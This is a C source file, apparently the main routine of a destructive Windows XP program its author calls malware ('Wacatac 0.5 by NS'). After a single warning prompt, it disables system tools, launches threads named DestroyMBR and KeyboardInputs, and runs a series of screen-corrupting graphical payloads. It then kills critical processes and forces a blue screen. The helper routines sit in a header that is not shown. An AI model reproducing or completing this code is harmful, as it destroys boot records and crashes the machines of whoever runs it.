typedef struct IUnknown IUnknown;

#include "Wacatac.h"

/*                      Wacatac 0.5 by NS
   This malware was named after Wacatac (a trojan horse that can copy itself)
                     It only runs on Windows XP.
    I'm not responsible for any damages caused as a result of this malware.
*/

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) 
{
	if (MessageBoxW(NULL, L"You are running a malware known as Wacatac 0.5 by NS,\n\nThis only has one warning so make your choice!\r\nY or N?", L"Wacatac 0.5", MB_YESNO|MB_DEFBUTTON2|MB_ICONWARNING) == IDNO)
	{
		return 0;
	}
	if (!CheckForWindowsXP()) NotWindowsXP();
	DisableTools();
//	Infection();
	Sleep(7000);
	CreateThread(NULL, NULL, KeyboardInputs, NULL, NULL, NULL);
	CreateThread(NULL, NULL, DestroyMBR, NULL, NULL, NULL);
	
	// RGBQUAD + SPHERE
	HANDLE hPML1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hSPH = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPayload1 = CreateThread(NULL, NULL, RGBQUAD1, hPML1, NULL, NULL);
	HANDLE hSphere = CreateThread(NULL, NULL, Sphere, hSPH, NULL, NULL);
	BB1();
	Sleep(20000); // 20 Seconds
	EndPayload(hPayload1, hPML1);
	
	if (!CheckForWindowsXP()) NotWindowsXP2();
	ProgramOpener();
	
	// RGBQUAD 2 + WEF
	HANDLE hPML2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hWEF1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hWef1 = CreateThread(NULL, NULL, Wef1, hWEF1, NULL, NULL);
	HANDLE hPayload2 = CreateThread(NULL, NULL, RGBQUAD2, hPML2, NULL, NULL);
	BB2();
	Sleep(30000); // 30 Seconds 
	EndPayload(hPayload2, hPML2);
	
	// MASH ALPHABLEND + TRIANGLE BOUNCE
	HANDLE hPML3 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hTRIBNC1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hTriangleBouncing = CreateThread(NULL, NULL, BouncingTriangle, hTRIBNC1, NULL, NULL);
	HANDLE hPayload3 = CreateThread(NULL, NULL, Blur1, hPML3, NULL, NULL);
	BB3();
	Sleep(30000); // 30 Seconds 
	EndPayload(hPayload3, hPML3);
	
	// MASH + TRIANGLES 
	HANDLE hPML4 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hGRDTRI = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hGradients1 = CreateThread(NULL, NULL, Gradients1, hGRDTRI, NULL, NULL);
	HANDLE hPayload4 = CreateThread(NULL, NULL, Melt, hPML4, NULL, NULL);
	BB4();
	Sleep(30000); // 30 Seconds 
	EndPayload(hPayload4, hPML4);
	EndPayload(hGradients1, hGRDTRI);
	
	KillCriticalProcesses();
	
	// EXECUTE EVERY PAYLOAD
	CreateThread(NULL, NULL, Melt, hPML4, NULL, NULL);
	CreateThread(NULL, NULL, Gradients1, hPML4, NULL, NULL);
	CreateThread(NULL, NULL, Blur1, hPML3, NULL, NULL);
	CreateThread(NULL, NULL, RGBQUAD1, hPML1, NULL, NULL);
	CreateThread(NULL, NULL, RGBQUAD2, hPML1, NULL, NULL);
	Sleep(60000); // 60 Seconds 
	
	/* The end */
	
	BlueScreenOfDeath();
}
